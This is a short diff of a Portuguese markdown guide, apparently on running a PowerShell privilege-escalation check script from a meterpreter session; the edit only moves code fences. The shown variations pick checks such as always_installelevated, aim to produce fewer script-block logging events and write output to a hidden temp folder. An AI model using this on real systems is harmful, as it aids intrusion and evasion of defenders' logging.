@@ -124,11 +124,14 @@ meterpreter > execute -f powershell.exe -a \
 
 *Variações úteis:*
 
-```
 # Só coleta rápida (menos eventos 4104):
+```
 ... -File ... -Quiet -Checks current_user,always_installelevated
 
+```
 # Reexecutar após queda de sessão (não refaz o que já coletou):
+
+```
 ... -File ... -Quiet -Resume -OutputDir C:\Windows\Temp\.cache_out
 
 ```
